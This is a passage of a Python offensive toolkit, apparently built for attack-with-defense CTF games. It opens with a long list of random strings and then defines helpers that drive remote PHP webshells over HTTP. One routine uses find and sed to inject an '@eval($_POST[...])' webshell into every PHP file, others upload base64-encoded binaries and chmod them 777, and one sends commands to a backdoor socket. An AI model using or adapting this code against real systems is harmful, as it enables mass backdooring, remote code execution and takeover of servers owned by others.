         'DJFRIedg', 'xjXk5LiC', 'cl2unOeD', 'g4vypLoC', 'sl4B97Fi', 'RVnBugZk', 'HR9hKfSx', 'etvc4goH', 'fX7gx1Zk',
         'b4mQpW7i', 'o20h1rzJ', 'P1wek90c', 'HObdCam7', 'MRHqXOag', '8sMRNx2D', 'GZuhQgqB', 'sXjrTVlv', 'LWNfhEyu',
         'DyGqwhLk', 'sdyefYPJ', 'Vvkcmlf4', 'IKUbwFgz', '8JLRyhKm', 'oHSxkWKt', 'y3SMuiWg', 'Ub53ZkFf', 'I39wXsOJ',
         'wf9Weq6r', 'q2IWd0Hl', 'RktyfFLE', 'cgXUMtar', 'koRKgUCe', '45IrpGxu', 'mL6CMZBD', 'u2dawrnV', '5hNcJiTO',
         'S4ifseo0', 'bAyv0ZEi', '8Am51qPf', 'NyT4bPeo', 'fywuOsAz', '0lY2rcCR', 'U6EYnwGp', 'RI2eiJvC', 'hW0aRcLq',
         'ERJh10Bu', 'S2w8vAXU', 'XVmxgupD', 'ARLTrj4S', '7p2xuoNS', 'h7alV24X', 'LboBud8y', '0ykGqNU6', 'WDgwltTe',
         'TZfWyzmM', 'BI1MDAPi', 'JIahiROg', 'm9gwYaCH', '8FpLkj53', 'U2GvToex', 'r75p6Ow0', 'yiFbKaux', 'xFZAgLYv',
         'DLCd1Erx', 'asPc7Blb', 'DXOlPSUg', 'SPvy7O9t', 'sCjcxIYm', 'TWdlYgBo', 'LYmI7rqS', 'zYSdqrau', 'OFCdMD93',
         'GXlVicKP', 'S9rhBwzT', '08CtTdvj', '9FVWh2Pu', 'j861FVvH', 'Mtc7aCPq', 'e0zhyZDd', 'vOwgQ2Kt', '6JkghwYr',
         'IkCOg1rK', 'F6ZaeN0k', 'QrkCmc9G', 'YbmXhRWF', 'X6DvJFpi', '3abKOkgt', 'U05f69El', 'NCvradmX', 'ZcnTxW6G',
         'bmwpOShW', 'Xn7456Dw', '5q0hCNPB', 'W9UqyLcp', 'oX8i71ew', 'Kr2BdwzY', 'KZYqOXHe', 'aic0YZBC', 'a4Eqh70K',
         '7fFgvx8m', 'QpVUTdm1', 'oPUVAhc5', 'QrtfVmYh', 'OBKoCXWm', 'L2ifklj8', 'tJmspLnj', 'zZ2CEJl7', 'cG5UsaOy',
         'WsU3wD1C', '6q0Zj4nH', 'sbJcxzDd', 'LO0Qxg4d', 'Wf1u4G39', 'JfDYxvku', 'OJL6UZsG', 'LUF61q7R', 'CgrWSzeD',
         'ucSYy2Dh', 'rNDMRG1C', '1fIMBZij', 'nRpBflUk', 'xFjsiho1', 'GXo0Psbz', '6tdycSE9', 'yGxYN89r', 'uc1sAQen',
         'SEZlKtFw', 'VxXsgtYk', 'xQWPl9mk', 'IY5bJurE', 'vzPYeRCV', 'T6lHvkyf', 'sbJrY53y', 'D12vos0p', 'U5O8oydc',
         'BnuyXjIq', 'VjcE9zBn', 'oQvuiSqG', 'rXnF6HpY', 'Xnf02dMN', 'Vz8uhwBC', 'KaRgCHLf', 'GpPHexoU', '5vOC4xyg',
         'UnQO20mu', 'Vj7u8nJ5', 'F1dc3fS4', 'y0HKxUB3', 'WRoeQxX6', '2D9YmLoR', 'vejSxuYB', 'WTf3ODZ4', 'SGqLW8ND',
         '56H4GhCe', 'y7Ibr5wE', 's3ofcUt5', 'yiTmJKXu', 'POJYnxqM', 'itkSwmuy', '1T6lsi9S', 'nxaVufrD', 'pqkeaQh6',
         'YZ3IJBAa', 'GIN9HLwa', 'RCHm8vfu', '0eEKxqUc', '04XDKsLN', 'mQ9ubadg', 'dq9OeYD6', 'hIucGlDe', 'Oh4jqynD',
         'vgjA7H3L', 'K8HaYc1u', 'DJhQrYf5', 'P7LVeQWg', 'cbuON1PU', 'iru0mJlA', 'hQ5L1nyS', 'VmCnEj9b', 'm5e76fnO',
         'e6DCLY9a', 'HP7BF8Zk', 'mhxLinSc', 'CYzJ7tZu', 'BaMVU6fv', 'hcrIalUO', 'hgG4t3rH', 'u3EehkmU', '7hIPJUEs',
         'S6XkyEGU', 'kUaiKtDJ', 'Wsd0OmN4', 'G2fW3lB8', 'DZp2vJgh', 'tz62HyYj', 'KQjw7Yq4', 'KQUej0oO', 'ONx3kdqE',
         'mQHnC4Fy', 'cCTSub5t', '385NFxEb', 'CS4oNnwf', 'zRvMYCFD', 'RLDlnEx8', 'FOITSmUc', 'vUgzlS7r', 'N2BoOiAY',
         'GlzI9p4E', '5u2Dm6pW', 'czywMORg', '1V7tHU3w', 'fpsbQClU', 'RCrf8o1i', 'vd1HFY8A', 'xGQm5fLB', 'YQgi8XlJ',
         'YPBrml26', 'TQ3MF9Vc', 'HcCAVSQZ', 'EIPdzRrW', 'qLQCPKJI', 'Qbc53IYh', 'PhN7m2nT', 'EOGNIwba', 'VBUPA8N4',
         'MLq9nSHf', 'XW8wr2YR', '6zObS5Jp', 'O6N8zq5W', 'DqMBITu9', '9b3hBgUJ', 'Ayv89KUn', 'jBepwqTg', 'X9CHoicO',
         '8gwSblaK', 'eq6d2Xcm', 's1w3mBzf', 'D5XuseRA', 'ziCqO9jx', 'Y9kw4h5J', 'Lg61jfTN', 'LYxBoqs0', '8kQd31Ip',
         'qRCMQbiz', 'qnQHbxF4', 'IEPJm3TR', '4lU1SqjL', 'bBqxGsT8', 'URdi0lCp', '6jFSI1Vd', 'mN60M7qe', 'Vjd1vkW5',
         'lh4ujvXx', 'W9gcHDVI', 'w1LebOKY', 'YAb2sHCG', '0B5dsODZ', 'ugw5Mmba', 'XBpNlyF4', 'jegaLd8s', 'yPaSLcwC',
         'V8SJszt1', 'MSylBKxk', 'MpA4qi35', 'n3ReStPL', 'w2Y1fr3u', 'unGPDViH', '2MrONByT', 'NKpPLaiH', '2ljVJLcz',
         'QFIDZO3p', 'IXb8zLPG', 'GPxVW0gC', 'GBb9gD8P', 'zhUmjSTq', 'RTj42CyU', 'BCzOJDGh', 'Xg4beVAv', 'NYzLu6Tm',
         'Xyi2u30v', 'ogbBkmvW', 'CeH28Ypy', 'oXy5TvGS', 'sQNyHq5d', 'S8QMimpz', 'Bgl7a3rI', 'xR1uIv63', 'MdrK73aI',
         '6leZEHGC', 'bFHhZxUs', 'woF3fPg9', '7VkE69Sp', 'gUIjexvP', 'Voe0SLgJ', 'TyDYNSfl', '1Pxslpeo', 'vPmy0tOU',
         'BVkwSqac', '8XGR52Mh', 'LSRO8fEk', '2Yq1dWxB', 'DifTFSZX', '8hcs2TlM', 'fh4dW8uA', '7IL1rim9', 'qMTjISnL',
         'vSQMuoCg', '0cR1CDvT', 'HRBZOueq', 'q2zf3KdL', 'MaruAQ8e', '6o3Rkyqj', '0vJKLpxE', '6IkDcrJ9', 'tNkS13lD',
         '2g0lKihp', 'hQuCEHAb', 'VtoGch6E', '1LQwO6bz', 'j45Sh60X', 'bG5jEDKS', 'aQ2hAlKv', 't9Kw3Wo4', '0o6wXKCy',
         'dauE29GC', '6wlLK4UB', '4kOrAxEi', 'thKQC4By', 'IjSFAMCD', 'jZGTugY1', 'FpCNJieW', 'ukNs68ZX', 'QRPZE8Bn',
         'T8ocHmpA', 'HS3Z1BlM', 'HwrlBK0b', 'YiMI0pHP', 'vCBsXlV8', 'OtTM1lSx', 'pKUV7lhu', 'JRXyc3uV', 'kignjMUK',
         'BydAQ16E', 'WFJAH0Ka', 'mqJlHKW0', 'EBGr4kIh', 'qbiFvCt5', 'J6gX8G9b', 'OVyeg1NX', 'KtZ5E6TQ', 'OE5uw68J',
         'dJ16eCBi', 'ymSX4jMq', 'm9Gup4is', 'ivhf4sbq', 'i5x20GsO', 'uOLH2mzi', 'DbXmAJT1', 'CBdU04af', '1ZWLjqmx',
         'Dabkz2oE', 'rKsCxRLH', 'bHUWEkBc', 'KgAYk41P', 'bFc7EaOU', 'wgPRGCyi', 'DRCsJ4eZ', '6dPtfwWg', 'RlZ1VfWS',
         'XnTU5f8r', '7w3ZpxRh', 'D8BIhYpz', 'hpaEQOy1', 'ZzTl2CdN', 'U9hzXTZw', 'vsrgc2on', 'mv7TDFpH', 'ziwBMYSX',
         'K5Iw2nJZ', 'y9pv6MNk', 'p1wBSMXk', 'dTl4bGa3', 'LafIk2wC', 'wWXJ8k7K', 'obwe94Vn', 'FYWQez8s', '3BeOi1hL',
         '4bsjBwE3', 'veVUdpoA', 'OKZhcmV3', 'nZsh3STz', 'O4GvQFCi', 'KEZopCey', 'mSBobyE3', 'jhB2oJCe', 'p6WfPCgY',
         'wpZVQ3SG', '5KoqR3ji', '7E24tYwm', '4fKqjVxl', '3bsLtMYH', 'B3ODSaYX', '3xZwf9s8', 'M3SiqRd6', 'e4Xxq7Wg',
         'l0JWUIto', '5MPdONWl', 'QR7pFOid', 'wDgQeohT', 'TwQU9dGk', 'gCjVIXNf', 'mWZDJAKt', 'b2Pje4oH', 'ltSR05hy',
         'Hv40fCtL', 'Kw6IVl8s', 'f7tKyEvz', 'AVd1ZUFq', 'frHbwzxG', 'BGkLbiER', '1R7lfi8y', 'dLewY1kD', 'apPvZhiA',
         'cDUuIAvY', 'Uc8mVMdo', 'NHbndGmE', 'XiuDyvck', 'CpeU32oK', 'TyVa9Gk8', 'nKjkLSfy', '7KA4RT1v', 'rQRj2gw7',
         'UO2W4Rj0', 'jNxlAhtu', 'chjqFNW2', 'Tvg5bCtp', 'GNqgWPBv', 'wTz5arAx', 'juUCyonm', 'd9ADF6tk', 'FBb7ag2m',
         'Ani38vZ9', 'HbLd6G8v', 'xBkSli96', 'gjQrP751', 'ZX8zqIRf', 'TkciW1nr', 'N2Ey7lzL', 'w5i6N7yC', 'AlBvP6E0',
         '3n5WkRyB', 'QvVKG0fE', '4iEn5tPN', 'zdxjl3Dr', 'a3k7vnHF', 'WBwYC01G', '8VEpqL3B', 'TUKn97Xi', 'LxbWfwae',
         'fJnZHFdK', 'VyZRexMY', 'NUzjpfI6', 'stKjcpI4', 'F0835D9C', 'vrECsP5F', '9HRJdP0N', '2ruEWp3m', 'UAvm6gMy',
         '75yUOAkn', 'tC81wp09', 'ue80LXpo', 'cEA5fxaQ', 'o6eVucZi', 'mNhPHorC', 'uIgZdmNv', 'EXKk70R1', 'PvpXytr5',
         'OPFeJlnK', '4qXcH7R0', 'XBDgqKC9', 'LnDmiQVs', 'jJ1ZDMdW', 'PI8ebVfs', 'TUNdZOpl', 'q8lKTQYP', 'LwK1CQYI',
         'nYpA8zT0', 'GUkzN1LS', 'MmWjianD', 'GbBCmRgs', 'oT1nifWe', 'PHSTuBpG', 'vsLehA7o', 'B5uhR690', 'v7um8UaA',
         'jaCLxHXK', 'YaGixpKZ', 'Mqkia8tP', 'l25gFoPh', 'jqPfCBs5', '1K4GrRAu', 'e9kVSp62', 'hIrXgsZA', 'eEjZlgHT',
         'bnBuUIVQ', 'Clq6kuYm', 'RgyDkUfO', 'Vp2sWXBb', 'BnZsdgzV', 'gU5GzZsJ', 'ZHigbGBa', 'xuBbFZ2s', '0m3QxDWJ',
         'iFYzwTCS', 'cmx6oivs', 'kA4NJ0QE', 'CzqWJH6s', 'rI8kCZJt', 'Ez4DVtok', 'mJtGXwNO', 'vHroPNAb', 'VRoFuApf',
         'QH6T4Sid', '0zhZS5jJ', 'e6tARhUL', 'PGnYa0VN', 'qHFETUX0', '1eTAyJ93', '8azrTftN', 'swRHYydu', 'hm3jlfcW',
         'XksJawvK', 'sBgie01y', '6zlyp2Yx', 'euEjVryC', 'VxLTUidW', 'zqi1dm3F', 'ekYSKbvh', 'A2Mc8JxF', 'Q9iVdFmg',
         'urZWl4C3', 'FvKOazfs', '1vQsbaln', 'VLCqf5rs', 'nWiEhgpc', '6OvQthau', 'o7LICNMp', 'yO5SYKaU', 'WyuFX9V2',
         'WsGbiPNO', 'wXaPkO0s', 'SqMJ8WZT', 'npyQTiBH', 'cqUhJEKi', 'svEd1FIH', 'uhKdA7gR', 'ezc73tV2', 'JtAP23Vk',
         'KX4xCSgm', '8Ukwm7Kd', 'p3Afsh9t', '6kjYt8NM', 'LOgp7DdV', 'pBsHYXDd', '79fX4ukh', 'hf2cNXzR', 'fXsCbvth',
         'KdwmYuUx', 'k57FRKcN', 'MzpCsVYJ', 'vV2s4Bye', 'uo6rSzsk', 'yBA298Vv', '6QOuvJ8Z', 'koUu8JW3', 'odtbKr4k',
         'JhobEPDz', 'E4HlAvNG', 'msIRXdFg', 'q4HFpPlu', 'kfjtpJPd', 'M2qDVnpE', 'DhXIzbdK', 'RXWt0GpP', 'RIz9v30w',
         'klgXboN7', 'dRg9D6Nz', 'LEyCQcWZ', 'vy4R2euZ', '0HsTO5vq', 'g9LrU8pq', 'H4b8DdjI', 'LV5YkwpK', 'namowbrQ',
         'h6bWzZ7s', '5enYpR0r', 'pxPghILM', 'oV6TF2ed', '7StjiZ4z', 'KOfI6RNT', 'l7HgQPBo', 'GcYK0HUJ', 'htzg0ScM',
         'lMWoxdVb', 'ONGD4X68']


class SSH:
    def __init__(self, ip, un, pwd, port=22):
        self.ip = ip
        self.un = un
        self.pwd = pwd
        self.port = port
        self.Client = sshc.SSHClient()
        self.Client.set_missing_host_key_policy(sshc.AutoAddPolicy())
        self.Client.connect(self.ip, self.port, self.un, self.pwd)
        self.channel = self.Client.get_transport().open_session()
        self.channel.get_pty()
        self.channel.invoke_shell()

    def __del__(self):
        self.channel.close()
        self.Client.close()

    def run(self, cmd=''):
        rt = b''
        try:
            si, so, se = self.Client.exec_command(cmd)
            rt += so.read() + se.read()
        except:
            rt += b''
        return rt.decode()

    def send(self, cmd='', waitfor=''):
        if not cmd.strip().endswith('\r'):
            cmd += '\r'
        self.channel.send(cmd)
        ret = b''
        for i in range(50):
            time.sleep(0.2)
            ret += self.channel.recv(1024*3)
            if waitfor in ret:
                return ret.decode()
        return ret.decode()

    def sendList(self, cmdList=[]):
        ret = ''
        for i in cmdList:
            if isinstance(i, tuple):
                ret += self.send(i[0], i[1])
            else:
                ret += self.send(i)
        return ret

from threading import Thread
class urlTage:
    url = ""
    key = ""

    def __init__(self, url, key, dat={}):
        self.url = url
        self.dat = dat
        if '?' not in self.url:
            self.url += '?'
        if 'http' not in self.url:
            self.url = "http://" + self.url
        self.key = key

    def get(self, pl='system("ls");',mt=False):
        class mt_g(Thread):
            def __init__(self, url):
                self.url = url
            ret = ''
            def run(self):
                try:
                    ret = requests.get(self.url)
                    self.ret = ret.text
                except:
                    pass
        if mt :
            try:
                mt_g(self.url + '&' + self.key + '=' + pl).start()
                return "[001][Thread_Started]\n"
            except :
                return '[000][    0    ]\n'
        try:
            rec = requests.get(self.url + '&' + self.key + '=' + pl)
            print('[+]GET :' + pl)
            return '[%3s][%s]\n' % (rec.status_code, str(len(rec.text)).center(9)) + rec.text
        except:
            return '[000][    0    ]\n'

    def post(self, pl='system("ls");', dat=None,mt=False):
        if dat == None:
            dat = self.dat
        dat[self.key] = pl
        class mt_p(Thread):
            def __init__(self, url, data={}):
                self.url = url
                self.data = data
            ret = ''
            def run(self):
                try:
                    ret = requests.post(self.url, data=self.data)
                    self.ret = ret.text
                except:pass
        if mt :
            try:
                mt_p(self.url, data=dat).start()
                return "[001][Thread_Started]\n"
            except :
                return '[000][    0    ]\n'
        try:
            rec = requests.post(self.url, data=dat)
            print('[+]POST:' + pl)
            return '[%3d][%s]\n' % (rec.status_code, str(len(rec.text)).center(9)) + rec.text
        except:
            return '[000][    0    ]\n'

    def runFind(self, pl='cat {}', path='../', needSystem=True, filename='*.php'):
        pl = '''find {} -name "{}" -exec  {} \\;'''.format(path, filename, pl)  # find 执行命令 必须以 \; 结尾
        if needSystem:
            pl = "system('{}');".format(pl)
        print('[GET]' + self.get(pl)[:80].replace('\n', '__'))
        print('[POST]' + self.post(pl)[:80].replace('\n', '__'))

    def addHead(self, pl='''<?php  @eval(\\$_POST[\\"fucker\\"]); ?>''', path='../', needSystem=True,
                filename='*.php'):
        pl = 'sed -i  "1i {} "'.format(pl) + ' {}'
        self.runFind(pl, path, needSystem, filename)

    def putfile(self, pf=b'', fn='/tmp/up', cmd='echo "{}"|base64 -d >> {}'):
        b64 = base64.b64encode(pf).decode()
        pl = f"system('{cmd.format(b64, fn)}');"
        print('[GET]' + self.get(pl)[:80].replace('\n', '__'))
        print('[POST]' + self.post(pl)[:80].replace('\n', '__'))
        self.post("system('chmod 777 '+fn);");
        self.get("system('chmod 777 '+fn);");

    def postFile_phpw(self, fn, fnd='/tmp/DASCTF'):
        with open(fn, 'rb') as f:
            b64s = base64.b64encode(f.read()).decode()
        pl = {
            self.key: f'''$b="{b64s}";$c = base64_decode($b);$f = fopen("{fnd}",'w+');fwrite($f,$c);fclose($f);system("chmod 777 {fnd}");'''}
        requests.post(self.url, data=pl)



import socket

'''   
    while True:
        cmd =''.join([chr(ord(i)^0xF) for i in  input("CMD:")+' 2>&1'])
        s = awdf.socketSend('192.18.1.4',cmd,port=12368)
        print(s)
'''


def socketSend(ip, cmd='ls', port=12366, onlyChar=True, decoder='utf-8'):
    ret = b''
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        if isinstance(cmd, str):
            cmd = cmd.encode()
        s.send(cmd)
        line = s.recv(4096)
        while len(line) > 1:
            ret += line
            line = s.recv(4096)
        s.close()
    except:
        print(f'[-]{ip}:{port} ERROR')
        return f'[-]{ip}:{port} ERROR'
    if onlyChar:
        ret = ret[:ret.find(0)]
        try:
            ret = ret.decode(decoder)
        except:
            pass

    print(f'[+]{ip}:{port} RECIVED<-{len(ret)}')
    return ret



